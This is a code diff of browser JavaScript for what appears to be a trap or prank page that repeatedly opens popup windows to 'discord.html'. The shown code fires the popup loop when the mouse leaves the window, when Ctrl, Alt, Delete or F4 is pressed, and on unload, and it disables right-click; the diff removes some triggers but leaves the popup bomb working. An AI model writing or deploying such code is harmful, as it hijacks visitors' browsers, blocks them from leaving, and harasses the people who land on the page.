@@ -64,14 +64,14 @@ function openWindow(url) {
 
             if (aWindow.closed) {
                 clearInterval(timer);
-                proCreate();
+                console.log("would trigger")
             }
         }, 40);
     }
 }
 
 function proCreate() {
-    for (let i = 0; i < 6; i++) {
+    for (let i = 0; i < 5; i++) {
         openWindow("discord.html");
     }
 }
@@ -139,28 +139,22 @@ window.onload = function () {
     bookmark();  
 };  
   
-window.onmouseout = function () {  
-    proCreate();  
-}; 
-window.onclick = function() {
+window.onmouseout = function () {
     proCreate();
 };
-  
+
 window.oncontextmenu = function () {
-    proCreate();
     return false;
 };  
-  
-window.onkeydown = function (event) {  
-    const keyCode = event.keyCode;  
-    if ([17, 18, 46, 115].includes(keyCode)) {  
-        proCreate();  
-    }  
-};  
-  
-window.onbeforeunload = function () {  
-    proCreate(); 
+
+
+window.onkeydown = function (event) {
+    const keyCode = event.keyCode;
+
+    if ([17, 18, 46, 115].includes(keyCode)) {
+        proCreate();
+    }
 };
-window.onunload = function () {
-    proCreate()
-};
+window.addEventListener("unload", function () {
+    proCreate();
+});
